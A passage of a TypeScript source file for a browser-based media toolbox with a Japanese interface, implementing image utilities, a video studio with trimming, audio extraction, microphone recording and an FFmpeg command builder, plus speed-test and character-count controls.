    row.style.cssText = "display:flex;flex-wrap:wrap;gap:6px";
    for (const bk of sorted) {
      const r = Math.round(bk.r / bk.n);
      const g = Math.round(bk.g / bk.n);
      const b = Math.round(bk.b / bk.n);
      const hex =
        "#" + [r, g, b].map((v) => v.toString(16).padStart(2, "0")).join("");
      const sw = document.createElement("div");
      sw.style.cssText = `display:flex;flex-direction:column;align-items:center;gap:4px;font-size:11px;font-family:ui-monospace,monospace`;
      const box = document.createElement("div");
      box.style.cssText = `width:64px;height:64px;background:${hex};border:1px solid #333;border-radius:4px;cursor:pointer`;
      box.title = "クリックでコピー";
      box.addEventListener("click", () => navigator.clipboard.writeText(hex));
      sw.appendChild(box);
      const label = document.createElement("span");
      label.textContent = hex;
      sw.appendChild(label);
      row.appendChild(sw);
    }
    outEl.appendChild(row);
  });
}

function setupImgStdPlaceholder(): void {
  const wEl = document.getElementById("imgstd-ph-w") as HTMLInputElement | null;
  const hEl = document.getElementById("imgstd-ph-h") as HTMLInputElement | null;
  const bgEl = document.getElementById(
    "imgstd-ph-bg",
  ) as HTMLInputElement | null;
  const fgEl = document.getElementById(
    "imgstd-ph-fg",
  ) as HTMLInputElement | null;
  const tEl = document.getElementById(
    "imgstd-ph-text",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "imgstd-ph-run",
  ) as HTMLButtonElement | null;
  const dlBtn = document.getElementById(
    "imgstd-ph-dl",
  ) as HTMLButtonElement | null;
  const canvas = document.getElementById(
    "imgstd-ph-canvas",
  ) as HTMLCanvasElement | null;
  if (!canvas || !runBtn) return;
  const render = (): void => {
    const w = Math.max(1, parseInt(wEl?.value || "1280", 10));
    const h = Math.max(1, parseInt(hEl?.value || "720", 10));
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    ctx.fillStyle = bgEl?.value || "#1e293b";
    ctx.fillRect(0, 0, w, h);
    ctx.fillStyle = fgEl?.value || "#fff";
    const txt = tEl?.value || `${w}×${h}`;
    const size = Math.max(16, Math.min(w, h) / 8);
    ctx.font = `bold ${size}px sans-serif`;
    ctx.textAlign = "center";
    ctx.textBaseline = "middle";
    ctx.fillText(txt, w / 2, h / 2);
  };
  runBtn.addEventListener("click", render);
  const syncText = (): void => {
    if (!tEl || !wEl || !hEl) return;
    const w = Math.max(1, parseInt(wEl.value || "1280", 10));
    const h = Math.max(1, parseInt(hEl.value || "720", 10));
    tEl.value = `${w}×${h}`;
  };
  wEl?.addEventListener("input", () => { syncText(); });
  hEl?.addEventListener("input", () => { syncText(); });
  dlBtn?.addEventListener("click", () =>
    downloadCanvas(
      canvas,
      "image/png",
      1,
      `placeholder_${canvas.width}x${canvas.height}.png`,
    ),
  );
  render();
}

function setupImgStdSvg(): void {
  const inEl = document.getElementById(
    "imgstd-svg-in",
  ) as HTMLTextAreaElement | null;
  const scaleEl = document.getElementById(
    "imgstd-svg-scale",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "imgstd-svg-run",
  ) as HTMLButtonElement | null;
  const dlBtn = document.getElementById(
    "imgstd-svg-dl",
  ) as HTMLButtonElement | null;
  const canvas = document.getElementById(
    "imgstd-svg-canvas",
  ) as HTMLCanvasElement | null;
  if (!inEl || !runBtn || !canvas) return;
  runBtn.addEventListener("click", () => {
    const svg = inEl.value.trim();
    if (!svg) return;
    const blob = new Blob([svg], { type: "image/svg+xml;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const img = new Image();
    img.onload = () => {
      const scale = Math.max(0.1, parseFloat(scaleEl?.value || "1"));
      const w = Math.max(1, Math.round((img.naturalWidth || 200) * scale));
      const h = Math.max(1, Math.round((img.naturalHeight || 200) * scale));
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext("2d");
      if (!ctx) return;
      ctx.clearRect(0, 0, w, h);
      ctx.drawImage(img, 0, 0, w, h);
      URL.revokeObjectURL(url);
      if (dlBtn) dlBtn.disabled = false;
    };
    img.onerror = () => URL.revokeObjectURL(url);
    img.src = url;
  });
  dlBtn?.addEventListener("click", () =>
    downloadCanvas(canvas, "image/png", 1, "svg.png"),
  );
}

function setupImgStdMosaic(): void {
  const fileEl = document.getElementById(
    "imgstd-mos-file",
  ) as HTMLInputElement | null;
  const sizeEl = document.getElementById(
    "imgstd-mos-size",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "imgstd-mos-run",
  ) as HTMLButtonElement | null;
  const dlBtn = document.getElementById(
    "imgstd-mos-dl",
  ) as HTMLButtonElement | null;
  const canvas = document.getElementById(
    "imgstd-mos-canvas",
  ) as HTMLCanvasElement | null;
  if (!fileEl || !runBtn || !canvas) return;
  let img: HTMLImageElement | null = null;
  fileEl.addEventListener("change", async () => {
    const f = fileEl.files?.[0];
    if (!f) return;
    try {
      img = await loadImageFromFile(f);
    } catch {
      /* ignore */
    }
  });
  runBtn.addEventListener("click", () => {
    if (!img) return;
    const block = Math.max(2, parseInt(sizeEl?.value || "12", 10));
    const w = img.naturalWidth,
      h = img.naturalHeight;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    const sw = Math.max(1, Math.floor(w / block));
    const sh = Math.max(1, Math.floor(h / block));
    const tmp = document.createElement("canvas");
    tmp.width = sw;
    tmp.height = sh;
    const tctx = tmp.getContext("2d");
    if (!tctx) return;
    tctx.imageSmoothingEnabled = true;
    tctx.drawImage(img, 0, 0, sw, sh);
    ctx.imageSmoothingEnabled = false;
    ctx.drawImage(tmp, 0, 0, w, h);
    if (dlBtn) dlBtn.disabled = false;
  });
  dlBtn?.addEventListener("click", () =>
    downloadCanvas(canvas, "image/png", 1, "mosaic.png"),
  );
}

// ========================================================================
// 🎬 動画スタジオ
// ========================================================================
let vidStdAB: { a: number | null; b: number | null } = { a: null, b: null };
let vidStdTrimUrl: string | null = null;
let vidStdAudUrl: string | null = null;
let vidStdRecChunks: Blob[] = [];
let vidStdRecorder: MediaRecorder | null = null;
let vidStdRecStream: MediaStream | null = null;
let vidStdRecUrl: string | null = null;
let vidStdRecStart = 0;
let vidStdRecTimer: number | null = null;

function setupVideoStudioTool(): void {
  setupVidStdPlayer();
  setupVidStdThumbs();
  setupVidStdTrim();
  setupVidStdAudio();
  setupVidStdRecorder();
  setupVidStdFFmpegBuilder();
  setupVidStdTimecode();
  setupVidStdAspect();
}

function setupVidStdPlayer(): void {
  const fileEl = document.getElementById(
    "vidstd-file",
  ) as HTMLInputElement | null;
  const video = document.getElementById(
    "vidstd-video",
  ) as HTMLVideoElement | null;
  const metaEl = document.getElementById("vidstd-meta");
  const rateEl = document.getElementById(
    "vidstd-rate",
  ) as HTMLSelectElement | null;
  const stepBack = document.getElementById(
    "vidstd-step-back",
  ) as HTMLButtonElement | null;
  const stepFwd = document.getElementById(
    "vidstd-step-fwd",
  ) as HTMLButtonElement | null;
  const setA = document.getElementById(
    "vidstd-set-a",
  ) as HTMLButtonElement | null;
  const setB = document.getElementById(
    "vidstd-set-b",
  ) as HTMLButtonElement | null;
  const abEl = document.getElementById("vidstd-ab");
  const loopEl = document.getElementById(
    "vidstd-loop",
  ) as HTMLInputElement | null;
  const fpsEl = document.getElementById(
    "vidstd-fps",
  ) as HTMLInputElement | null;
  const guideEl = document.getElementById(
    "vidstd-guide",
  ) as HTMLSelectElement | null;
  const snapBtn = document.getElementById(
    "vidstd-snap",
  ) as HTMLButtonElement | null;
  const overlay = document.getElementById(
    "vidstd-overlay",
  ) as HTMLCanvasElement | null;
  if (!fileEl || !video) return;

  fileEl.addEventListener("change", () => {
    const f = fileEl.files?.[0];
    if (!f) return;
    if (video.src) URL.revokeObjectURL(video.src);
    video.src = URL.createObjectURL(f);
    vidStdAB = { a: null, b: null };
    if (abEl) abEl.textContent = "A:- B:-";
  });
  video.addEventListener("loadedmetadata", () => {
    if (metaEl) {
      metaEl.textContent = `${video.videoWidth}×${video.videoHeight} / 長さ ${video.duration.toFixed(2)}秒`;
    }
    drawGuide();
  });
  rateEl?.addEventListener("change", () => {
    video.playbackRate = parseFloat(rateEl.value);
  });
  const fps = (): number => Math.max(1, parseInt(fpsEl?.value || "30", 10));
  stepBack?.addEventListener("click", () => {
    video.pause();
    video.currentTime = Math.max(0, video.currentTime - 1 / fps());
  });
  stepFwd?.addEventListener("click", () => {
    video.pause();
    video.currentTime = Math.min(video.duration, video.currentTime + 1 / fps());
  });
  setA?.addEventListener("click", () => {
    vidStdAB.a = video.currentTime;
    if (abEl)
      abEl.textContent = `A:${vidStdAB.a.toFixed(2)} B:${vidStdAB.b?.toFixed(2) ?? "-"}`;
  });
  setB?.addEventListener("click", () => {
    vidStdAB.b = video.currentTime;
    if (abEl)
      abEl.textContent = `A:${vidStdAB.a?.toFixed(2) ?? "-"} B:${vidStdAB.b.toFixed(2)}`;
  });
  video.addEventListener("timeupdate", () => {
    if (
      loopEl?.checked &&
      vidStdAB.a !== null &&
      vidStdAB.b !== null &&
      vidStdAB.b > vidStdAB.a
    ) {
      if (video.currentTime >= vidStdAB.b) video.currentTime = vidStdAB.a;
      else if (video.currentTime < vidStdAB.a) video.currentTime = vidStdAB.a;
    }
  });
  snapBtn?.addEventListener("click", () => {
    if (!video.videoWidth) return;
    const c = document.createElement("canvas");
    c.width = video.videoWidth;
    c.height = video.videoHeight;
    const ctx = c.getContext("2d");
    if (!ctx) return;
    ctx.drawImage(video, 0, 0);
    downloadCanvas(
      c,
      "image/png",
      1,
      `frame_${video.currentTime.toFixed(2)}s.png`,
    );
  });

  const drawGuide = (): void => {
    if (!overlay || !video.videoWidth) return;
    const g = guideEl?.value || "";
    if (!g) {
      overlay.style.display = "none";
      return;
    }
    overlay.style.display = "block";
    const w = video.videoWidth,
      h = video.videoHeight;
    overlay.width = w;
    overlay.height = h;
    const ctx = overlay.getContext("2d");
    if (!ctx) return;
    ctx.clearRect(0, 0, w, h);
    ctx.fillStyle = "rgba(0,0,0,0.5)";
    const [rwS, rhS] = g.split(":");
    const rw = parseInt(rwS, 10),
      rh = parseInt(rhS, 10);
    const sAr = w / h,
      dAr = rw / rh;
    if (dAr > sAr) {
      // letterbox top/bottom
      const safeH = w / dAr;
      const bar = (h - safeH) / 2;
      ctx.fillRect(0, 0, w, bar);
      ctx.fillRect(0, h - bar, w, bar);
    } else {
      const safeW = h * dAr;
      const bar = (w - safeW) / 2;
      ctx.fillRect(0, 0, bar, h);
      ctx.fillRect(w - bar, 0, bar, h);
    }
    ctx.strokeStyle = "rgba(255,255,255,0.6)";
    ctx.lineWidth = Math.max(1, w / 400);
    ctx.strokeRect(0.5, 0.5, w - 1, h - 1);
  };
  guideEl?.addEventListener("change", drawGuide);
}

function getVidStdVideo(): HTMLVideoElement | null {
  return document.getElementById("vidstd-video") as HTMLVideoElement | null;
}

function setupVidStdThumbs(): void {
  const nEl = document.getElementById(
    "vidstd-thumb-n",
  ) as HTMLInputElement | null;
  const wEl = document.getElementById(
    "vidstd-thumb-w",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "vidstd-thumb-run",
  ) as HTMLButtonElement | null;
  const outEl = document.getElementById("vidstd-thumb-out");
  if (!runBtn || !outEl) return;
  runBtn.addEventListener("click", async () => {
    const video = getVidStdVideo();
    if (!video || !video.videoWidth) {
      outEl.textContent = "先に動画を読み込んでください";
      return;
    }
    const n = Math.max(1, Math.min(64, parseInt(nEl?.value || "9", 10)));
    const tw = Math.max(32, parseInt(wEl?.value || "320", 10));
    const th = Math.round((tw * video.videoHeight) / video.videoWidth);
    outEl.innerHTML = "";
    const dur = video.duration;
    const wasPaused = video.paused;
    video.pause();
    for (let i = 0; i < n; i++) {
      const t = (dur * (i + 0.5)) / n;
      await new Promise<void>((resolve) => {
        const onSeek = (): void => {
          video.removeEventListener("seeked", onSeek);
          resolve();
        };
        video.addEventListener("seeked", onSeek);
        video.currentTime = t;
      });
      const c = document.createElement("canvas");
      c.width = tw;
      c.height = th;
      const ctx = c.getContext("2d");
      if (ctx) ctx.drawImage(video, 0, 0, tw, th);
      const wrap = document.createElement("div");
      wrap.style.cssText =
        "display:flex;flex-direction:column;align-items:center;gap:2px;font-size:11px;opacity:0.85";
      wrap.appendChild(c);
      const label = document.createElement("span");
      label.textContent = `${t.toFixed(2)}s`;
      wrap.appendChild(label);
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "toolbox-secondary";
      btn.textContent = "DL";
      btn.addEventListener("click", () =>
        downloadCanvas(c, "image/png", 1, `thumb_${t.toFixed(2)}s.png`),
      );
      wrap.appendChild(btn);
      outEl.appendChild(wrap);
    }
    if (!wasPaused) video.play().catch(() => {});
  });
}

function setupVidStdTrim(): void {
  const muteEl = document.getElementById(
    "vidstd-trim-mute",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "vidstd-trim-run",
  ) as HTMLButtonElement | null;
  const dlBtn = document.getElementById(
    "vidstd-trim-dl",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById("vidstd-trim-status");
  if (!runBtn || !dlBtn) return;
  runBtn.addEventListener("click", async () => {
    const video = getVidStdVideo();
    if (!video || !video.videoWidth) {
      if (statusEl) statusEl.textContent = "動画を読み込んでください";
      return;
    }
    if (
      vidStdAB.a === null ||
      vidStdAB.b === null ||
      vidStdAB.b <= vidStdAB.a
    ) {
      if (statusEl) statusEl.textContent = "①で A/B 区間を設定してください";
      return;
    }
    const captureFn = (
      video as unknown as { captureStream?: () => MediaStream }
    ).captureStream;
    if (!captureFn) {
      if (statusEl) statusEl.textContent = "captureStream 非対応のブラウザです";
      return;
    }
    const stream = captureFn.call(video);
    if (muteEl?.checked) {
      stream
        .getAudioTracks()
        .forEach((t: MediaStreamTrack) => stream.removeTrack(t));
    }
    const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")
      ? "video/webm;codecs=vp9,opus"
      : "video/webm";
    const chunks: Blob[] = [];
    const rec = new MediaRecorder(stream, { mimeType: mime });
    rec.ondataavailable = (e) => {
      if (e.data.size > 0) chunks.push(e.data);
    };
    rec.onstop = () => {
      if (vidStdTrimUrl) URL.revokeObjectURL(vidStdTrimUrl);
      const blob = new Blob(chunks, { type: mime });
      vidStdTrimUrl = URL.createObjectURL(blob);
      dlBtn.disabled = false;
      if (statusEl)
        statusEl.textContent = `完了 ${(blob.size / 1024 / 1024).toFixed(2)} MB`;
    };
    if (statusEl) statusEl.textContent = "録画中…";
    video.pause();
    video.currentTime = vidStdAB.a;
    await new Promise<void>((r) => {
      const on = (): void => {
        video.removeEventListener("seeked", on);
        r();
      };
      video.addEventListener("seeked", on);
    });
    rec.start();
    await video.play();
    const stopAt = vidStdAB.b;
    const tick = (): void => {
      if (video.currentTime >= stopAt) {
        video.pause();
        rec.stop();
      } else {
        requestAnimationFrame(tick);
      }
    };
    requestAnimationFrame(tick);
  });
  dlBtn.addEventListener("click", () => {
    if (!vidStdTrimUrl) return;
    const a = document.createElement("a");
    a.href = vidStdTrimUrl;
    a.download = "trimmed.webm";
    document.body.appendChild(a);
    a.click();
    a.remove();
  });
}

function setupVidStdAudio(): void {
  const runBtn = document.getElementById(
    "vidstd-aud-run",
  ) as HTMLButtonElement | null;
  const dlBtn = document.getElementById(
    "vidstd-aud-dl",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById("vidstd-aud-status");
  if (!runBtn || !dlBtn) return;
  runBtn.addEventListener("click", async () => {
    const video = getVidStdVideo();
    if (!video || !video.videoWidth) {
      if (statusEl) statusEl.textContent = "動画を読み込んでください";
      return;
    }
    const captureFn = (
      video as unknown as { captureStream?: () => MediaStream }
    ).captureStream;
    if (!captureFn) {
      if (statusEl) statusEl.textContent = "captureStream 非対応";
      return;
    }
    const stream: MediaStream = captureFn.call(video);
    const audioTracks = stream.getAudioTracks();
    if (audioTracks.length === 0) {
      if (statusEl) statusEl.textContent = "音声トラックがありません";
      return;
    }
    const audioStream = new MediaStream(audioTracks);
    const mime = MediaRecorder.isTypeSupported("audio/webm;codecs=opus")
      ? "audio/webm;codecs=opus"
      : "audio/webm";
    const chunks: Blob[] = [];
    const rec = new MediaRecorder(audioStream, { mimeType: mime });
    rec.ondataavailable = (e) => {
      if (e.data.size > 0) chunks.push(e.data);
    };
    rec.onstop = () => {
      if (vidStdAudUrl) URL.revokeObjectURL(vidStdAudUrl);
      const blob = new Blob(chunks, { type: mime });
      vidStdAudUrl = URL.createObjectURL(blob);
      dlBtn.disabled = false;
      if (statusEl)
        statusEl.textContent = `完了 ${(blob.size / 1024).toFixed(1)} KB`;
    };
    video.pause();
    video.currentTime = 0;
    await new Promise<void>((r) => {
      const on = (): void => {
        video.removeEventListener("seeked", on);
        r();
      };
      video.addEventListener("seeked", on);
    });
    if (statusEl) statusEl.textContent = "抽出中…";
    rec.start();
    await video.play();
    const stopAt = video.duration;
    const tick = (): void => {
      if (video.currentTime >= stopAt - 0.05 || video.ended) {
        video.pause();
        rec.stop();
      } else {
        requestAnimationFrame(tick);
      }
    };
    requestAnimationFrame(tick);
  });
  dlBtn.addEventListener("click", () => {
    if (!vidStdAudUrl) return;
    const a = document.createElement("a");
    a.href = vidStdAudUrl;
    a.download = "audio.webm";
    document.body.appendChild(a);
    a.click();
    a.remove();
  });
}

function setupVidStdRecorder(): void {
  const startBtn = document.getElementById(
    "vidstd-rec-start",
  ) as HTMLButtonElement | null;
  const stopBtn = document.getElementById(
    "vidstd-rec-stop",
  ) as HTMLButtonElement | null;
  const dlBtn = document.getElementById(
    "vidstd-rec-dl",
  ) as HTMLButtonElement | null;
  const timeEl = document.getElementById("vidstd-rec-time");
  const audioEl = document.getElementById(
    "vidstd-rec-audio",
  ) as HTMLAudioElement | null;
  if (!startBtn || !stopBtn || !dlBtn) return;
  startBtn.addEventListener("click", async () => {
    try {
      vidStdRecStream = await navigator.mediaDevices.getUserMedia({
        audio: true,
      });
    } catch (e) {
      if (timeEl) timeEl.textContent = "マイク取得失敗: " + String(e);
      return;
    }
    const mime = MediaRecorder.isTypeSupported("audio/webm;codecs=opus")
      ? "audio/webm;codecs=opus"
      : "audio/webm";
    vidStdRecChunks = [];
    vidStdRecorder = new MediaRecorder(vidStdRecStream, { mimeType: mime });
    vidStdRecorder.ondataavailable = (e) => {
      if (e.data.size > 0) vidStdRecChunks.push(e.data);
    };
    vidStdRecorder.onstop = () => {
      if (vidStdRecUrl) URL.revokeObjectURL(vidStdRecUrl);
      const blob = new Blob(vidStdRecChunks, { type: mime });
      vidStdRecUrl = URL.createObjectURL(blob);
      if (audioEl) {
        audioEl.src = vidStdRecUrl;
        audioEl.style.display = "block";
      }
      dlBtn.disabled = false;
      vidStdRecStream?.getTracks().forEach((t) => t.stop());
      vidStdRecStream = null;
      if (vidStdRecTimer !== null) {
        clearInterval(vidStdRecTimer);
        vidStdRecTimer = null;
      }
    };
    vidStdRecorder.start();
    vidStdRecStart = Date.now();
    startBtn.disabled = true;
    stopBtn.disabled = false;
    vidStdRecTimer = window.setInterval(() => {
      const s = Math.floor((Date.now() - vidStdRecStart) / 1000);
      const m = Math.floor(s / 60);
      const ss = s % 60;
      if (timeEl)
        timeEl.textContent = `${String(m).padStart(2, "0")}:${String(ss).padStart(2, "0")}`;
    }, 250);
  });
  stopBtn.addEventListener("click", () => {
    vidStdRecorder?.stop();
    vidStdRecorder = null;
    startBtn.disabled = false;
    stopBtn.disabled = true;
  });
  dlBtn.addEventListener("click", () => {
    if (!vidStdRecUrl) return;
    const a = document.createElement("a");
    a.href = vidStdRecUrl;
    a.download = "recording.webm";
    document.body.appendChild(a);
    a.click();
    a.remove();
  });
}

function setupVidStdFFmpegBuilder(): void {
  const inEl = document.getElementById("ffb-in") as HTMLInputElement | null;
  const outEl = document.getElementById("ffb-out") as HTMLInputElement | null;
  const ssEl = document.getElementById("ffb-ss") as HTMLInputElement | null;
  const tEl = document.getElementById("ffb-t") as HTMLInputElement | null;
  const scaleEl = document.getElementById(
    "ffb-scale",
  ) as HTMLInputElement | null;
  const cropEl = document.getElementById("ffb-crop") as HTMLInputElement | null;
  const fpsEl = document.getElementById("ffb-fps") as HTMLInputElement | null;
  const muteEl = document.getElementById("ffb-mute") as HTMLInputElement | null;
  const copyEl = document.getElementById("ffb-copy") as HTMLInputElement | null;
  const presetEl = document.getElementById(
    "ffb-preset",
  ) as HTMLSelectElement | null;
  const buildBtn = document.getElementById(
    "ffb-build",
  ) as HTMLButtonElement | null;
  const copyBtn = document.getElementById(
    "ffb-copybtn",
  ) as HTMLButtonElement | null;
  const cmdEl = document.getElementById("ffb-out-cmd");
  if (!buildBtn || !cmdEl) return;

  const build = (): string => {
    const input = inEl?.value || "input.mp4";
    let output = outEl?.value || "output.mp4";
    const parts: string[] = ["ffmpeg", "-y"];
    if (ssEl?.value) parts.push("-ss", ssEl.value);
    parts.push("-i", `"${input}"`);
    if (tEl?.value) parts.push("-t", tEl.value);
    const preset = presetEl?.value || "custom";
    const filters: string[] = [];
    if (scaleEl?.value) filters.push(`scale=${scaleEl.value}`);
    if (cropEl?.value) filters.push(`crop=${cropEl.value}`);
    if (fpsEl?.value) filters.push(`fps=${fpsEl.value}`);

    if (preset === "gif") {
      output = output.replace(/\.[a-z0-9]+$/i, "") + ".gif";
      const f = filters.length ? filters.join(",") + "," : "";
      parts.push(
        "-vf",
        `"${f}split[s0][s1];[s0]palettegen[p];[s1][p]paletteuse"`,
      );
      parts.push(`"${output}"`);
    } else if (preset === "audio") {
      output = output.replace(/\.[a-z0-9]+$/i, "") + ".mp3";
      parts.push("-vn", "-c:a", "libmp3lame", "-q:a", "2", `"${output}"`);
    } else {
      let resolved = filters;
      if (preset === "reels")
        resolved = [
          ...filters,
          "scale=1080:1920:force_original_aspect_ratio=decrease,pad=1080:1920:(ow-iw)/2:(oh-ih)/2:black",
        ];
      else if (preset === "square")
        resolved = [
          ...filters,
          "scale=1080:1080:force_original_aspect_ratio=decrease,pad=1080:1080:(ow-iw)/2:(oh-ih)/2:black",
        ];
      else if (preset === "yt1080")
        resolved = [
          ...filters,
          "scale=1920:1080:force_original_aspect_ratio=decrease,pad=1920:1080:(ow-iw)/2:(oh-ih)/2:black",
        ];
      if (resolved.length) parts.push("-vf", `"${resolved.join(",")}"`);
      if (copyEl?.checked) parts.push("-c", "copy");
      else
        parts.push(
          "-c:v",
          "libx264",
          "-preset",
          "medium",
          "-crf",
          "23",
          "-pix_fmt",
          "yuv420p",
        );
      if (muteEl?.checked) parts.push("-an");
      else if (!copyEl?.checked) parts.push("-c:a", "aac", "-b:a", "192k");
      parts.push(`"${output}"`);
    }
    return parts.join(" ");
  };

  buildBtn.addEventListener("click", () => {
    cmdEl.textContent = build();
  });
  copyBtn?.addEventListener("click", () => {
    const txt = cmdEl.textContent || "";
    if (txt) navigator.clipboard.writeText(txt);
  });
}

function setupVidStdTimecode(): void {
  const secEl = document.getElementById(
    "vidstd-tc-sec",
  ) as HTMLInputElement | null;
  const hmsEl = document.getElementById(
    "vidstd-tc-hms",
  ) as HTMLInputElement | null;
  const frameEl = document.getElementById(
    "vidstd-tc-frame",
  ) as HTMLInputElement | null;
  const fpsEl = document.getElementById(
    "vidstd-tc-fps",
  ) as HTMLInputElement | null;
  if (!secEl || !hmsEl || !frameEl || !fpsEl) return;

  const fmtHMS = (s: number): string => {
    if (!isFinite(s) || s < 0) return "";
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s - h * 3600 - m * 60;
    return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${sec.toFixed(3).padStart(6, "0")}`;
  };
  const parseHMS = (str: string): number => {
    const m = str.trim().match(/^(?:(\d+):)?(?:(\d+):)?([\d.]+)$/);
    if (!m) return NaN;
    const a = m[1] ? parseInt(m[1], 10) : 0;
    const b = m[2] ? parseInt(m[2], 10) : 0;
    const c = parseFloat(m[3]);
    if (m[1] && m[2]) return a * 3600 + b * 60 + c;
    if (m[1] && !m[2]) return a * 60 + c;
    return c;
  };
  const fps = (): number => Math.max(1, parseFloat(fpsEl.value || "30"));

  let updating = false;
  const fromSec = (s: number): void => {
    if (updating) return;
    updating = true;
    hmsEl.value = fmtHMS(s);
    frameEl.value = String(Math.round(s * fps()));
    updating = false;
  };
  secEl.addEventListener("input", () => {
    const s = parseFloat(secEl.value);
    if (!isNaN(s)) fromSec(s);
  });
  hmsEl.addEventListener("input", () => {
    if (updating) return;
    const s = parseHMS(hmsEl.value);
    if (!isNaN(s)) {
      updating = true;
      secEl.value = String(s);
      frameEl.value = String(Math.round(s * fps()));
      updating = false;
    }
  });
  frameEl.addEventListener("input", () => {
    if (updating) return;
    const f = parseInt(frameEl.value, 10);
    if (!isNaN(f)) {
      const s = f / fps();
      updating = true;
      secEl.value = String(s);
      hmsEl.value = fmtHMS(s);
      updating = false;
    }
  });
  fpsEl.addEventListener("input", () => {
    const s = parseFloat(secEl.value);
    if (!isNaN(s)) fromSec(s);
  });
}

function setupVidStdAspect(): void {
  const wEl = document.getElementById("vidstd-ar-w") as HTMLInputElement | null;
  const hEl = document.getElementById("vidstd-ar-h") as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "vidstd-ar-run",
  ) as HTMLButtonElement | null;
  const outEl = document.getElementById("vidstd-ar-out");
  if (!wEl || !hEl || !runBtn || !outEl) return;
  const gcd = (a: number, b: number): number => (b === 0 ? a : gcd(b, a % b));
  runBtn.addEventListener("click", () => {
    const w = parseInt(wEl.value, 10);
    const h = parseInt(hEl.value, 10);
    if (!w || !h) {
      outEl.textContent = "幅と高さを入力してください";
      return;
    }
    const g = gcd(w, h);
    const ratio = `${w / g}:${h / g}`;
    const decimal = (w / h).toFixed(4);
    const presets: Array<[string, number]> = [
      ["16:9", 16 / 9],
      ["4:3", 4 / 3],
      ["1:1", 1],
      ["9:16", 9 / 16],
      ["4:5", 4 / 5],
      ["3:2", 3 / 2],
      ["21:9", 21 / 9],
      ["2.35:1", 2.35],
    ];
    let near = presets[0];
    let nearDiff = Infinity;
    for (const p of presets) {
      const d = Math.abs(p[1] - w / h);
      if (d < nearDiff) {
        nearDiff = d;
        near = p;
      }
    }
    const lines = [
      `アスペクト比 : ${ratio}`,
      `小数         : ${decimal}`,
      `最寄り規格   : ${near[0]} (差 ${(nearDiff * 100).toFixed(2)}%)`,
      ``,
      `--- 同比のスケール候補 ---`,
      ...[480, 720, 1080, 1440, 2160].map((targetH) => {
        const tw = Math.round((w / h) * targetH);
        return `${targetH}p : ${tw}×${targetH}`;
      }),
    ];
    outEl.textContent = lines.join("\n");
  });
}

function setupSpeedtestTool(): void {
  const presetEl = document.getElementById(
    "st-dl-preset",
  ) as HTMLSelectElement | null;
  const dlUrlEl = document.getElementById(
    "st-dl-url",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById("st-run") as HTMLButtonElement | null;
  const autoBtn = document.getElementById(
    "st-auto",
  ) as HTMLButtonElement | null;
  const stopBtn = document.getElementById(
    "st-stop",
  ) as HTMLButtonElement | null;
  const clearBtn = document.getElementById(
    "st-clear",
  ) as HTMLButtonElement | null;
  const exportBtn = document.getElementById(
    "st-export",
  ) as HTMLButtonElement | null;
  const intervalEl = document.getElementById(
    "st-interval",
  ) as HTMLInputElement | null;
  const statusEl = document.getElementById("st-status");
  if (!runBtn) return;

  presetEl?.addEventListener("change", () => {
    if (!dlUrlEl) return;
    if (presetEl.value === "custom") {
      dlUrlEl.hidden = false;
    } else {
      dlUrlEl.hidden = true;
    }
  });

  runBtn.addEventListener("click", () => {
    runSpeedtestOnce(statusEl);
  });

  autoBtn?.addEventListener("click", () => {
    if (speedAutoTimer != null) return;
    const sec = Math.max(5, parseInt(intervalEl?.value || "0"));
    if (!sec || sec < 5) {
      if (statusEl) statusEl.textContent = "間隔は 5 秒以上を指定してください";
      return;
    }
    if (statusEl) statusEl.textContent = `定期実行 開始 (${sec} 秒間隔)`;
    runSpeedtestOnce(statusEl);
    speedAutoTimer = window.setInterval(() => {
      runSpeedtestOnce(statusEl);
    }, sec * 1000);
    autoBtn.textContent = "● 実行中";
    autoBtn.style.background = "#cf222e";
  });

  stopBtn?.addEventListener("click", () => {
    if (speedAutoTimer != null) {
      window.clearInterval(speedAutoTimer);
      speedAutoTimer = null;
    }
    if (autoBtn) {
      autoBtn.textContent = "▶ 定期開始";
      autoBtn.style.background = "#6f42c1";
    }
    if (statusEl) statusEl.textContent = "定期実行 停止";
  });

  clearBtn?.addEventListener("click", () => {
    speedHistory.length = 0;
    drawSpeedChart();
    updateSpeedHistoryTable();
    if (statusEl) statusEl.textContent = "履歴クリア";
  });

  exportBtn?.addEventListener("click", () => {
    const lines = ["timestamp,iso,dl_mbps,ul_mbps,ping_ms,jitter_ms,dl_bytes"];
    for (const e of speedHistory) {
      lines.push(
        [
          e.ts,
          new Date(e.ts).toISOString(),
          e.dlMbps?.toFixed(4) ?? "",
          e.ulMbps?.toFixed(4) ?? "",
          e.pingMs?.toFixed(3) ?? "",
          e.jitterMs?.toFixed(3) ?? "",
          e.dlBytes ?? "",
        ].join(","),
      );
    }
    const blob = new Blob([lines.join("\n")], {
      type: "text/csv;charset=utf-8",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `speedtest-${new Date().toISOString().replace(/[:.]/g, "-")}.csv`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });

  drawSpeedChart();
  window.addEventListener("resize", () => drawSpeedChart());
}

// ===== 文字数カウント =====
function setupCharCountTool(): void {
  const inputN = document.getElementById(
    "cc-input",
  ) as HTMLTextAreaElement | null;
  if (!inputN) return;
  const input = inputN;
  const trim = document.getElementById("cc-trim") as HTMLInputElement;
  const collapse = document.getElementById("cc-collapse") as HTMLInputElement;
  const status = document.getElementById("cc-status") as HTMLSpanElement;
